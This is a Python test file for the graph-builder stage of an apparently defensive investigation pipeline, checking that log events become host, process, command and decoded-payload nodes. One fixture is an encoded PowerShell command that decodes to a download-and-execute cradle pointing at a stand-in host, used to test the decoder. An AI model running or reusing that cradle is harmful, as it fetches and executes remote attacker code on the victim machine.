"""Stage 8 · Investigation Graph builder tests."""
import json

from nivxforge.investigation.pipeline.artifact_discovery import discover
from nivxforge.investigation.pipeline.evidence_extraction import extract
from nivxforge.investigation.pipeline.graph_builder import (
    EDGE_RELATIONS, NODE_KINDS, build,
)
from nivxforge.investigation.pipeline.input_classification import classify_input
from nivxforge.investigation.pipeline.normalizers import normalize
from nivxforge.investigation.pipeline.parser import parse_input
from nivxforge.investigation.pipeline.recursive_decoder import decode
from nivxforge.investigation.pipeline.vendor_detection import detect_vendor


def _graph(raw: str):
    parsed = parse_input(raw, classify_input(raw))
    cem = normalize(parsed, detect_vendor(parsed))
    arts = discover(cem)
    layers = decode(arts)
    bundle = extract(cem, arts, layers)
    return build(cem, bundle), cem, arts, layers, bundle


def test_graph_nodes_and_edges_are_tuples():
    g, *_ = _graph(json.dumps({"EventID": 1, "Computer": "h",
                                "CommandLine": "cmd /c echo hi",
                                "Image": "cmd.exe", "ProcessId": 1}))
    assert isinstance(g.nodes, tuple)
    assert isinstance(g.edges, tuple)


def test_node_kinds_within_taxonomy():
    g, *_ = _graph(json.dumps({"EventID": 1, "Computer": "h",
                                "CommandLine": "cmd /c whoami",
                                "Image": "cmd.exe"}))
    for n in g.nodes:
        assert n.kind in NODE_KINDS


def test_edge_relations_within_taxonomy():
    g, *_ = _graph(json.dumps({"EventID": 1, "Computer": "h",
                                "CommandLine": "cmd /c whoami",
                                "Image": "cmd.exe"}))
    for e in g.edges:
        assert e.relation in EDGE_RELATIONS


def test_graph_links_process_to_host_and_command():
    g, *_ = _graph(json.dumps({
        "EventID": 1, "Computer": "host-x",
        "Image": "cmd.exe",
        "CommandLine": "cmd /c whoami",
    }))
    kinds = {n.kind for n in g.nodes}
    assert {"host", "process", "command"}.issubset(kinds)
    relations = {e.relation for e in g.edges}
    assert "executed_on" in relations
    assert "belongs_to" in relations


def test_graph_dedups_repeated_evidence():
    # Same host referenced twice → one host node in graph.
    payload = "\n".join([
        json.dumps({"EventID": 1, "Computer": "same-host",
                    "Image": "a.exe", "CommandLine": "a"}),
        json.dumps({"EventID": 1, "Computer": "same-host",
                    "Image": "b.exe", "CommandLine": "b"}),
    ])
    g, *_ = _graph(payload)
    hosts = [n for n in g.nodes if n.kind == "host"]
    assert len(hosts) == 1


def test_graph_decoded_payload_edge():
    raw = ("powershell.exe -EncodedCommand "
            "SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu"
            "AE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGE"
            "AZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbw"
            "BtAC8AcAAxACcAKQAp")
    g, *_ = _graph(raw)
    kinds = {n.kind for n in g.nodes}
    assert "decoded_payload" in kinds
    relations = {e.relation for e in g.edges}
    assert "decoded_to" in relations


def test_graph_to_dict_shape():
    g, *_ = _graph(json.dumps({"EventID": 1, "Computer": "h",
                                "Image": "cmd.exe",
                                "CommandLine": "cmd /c whoami"}))
    d = g.to_dict()
    assert "nodes" in d and "edges" in d
    assert all("id" in n and "kind" in n for n in d["nodes"])
    assert all("from" in e and "to" in e and "relation" in e for e in d["edges"])
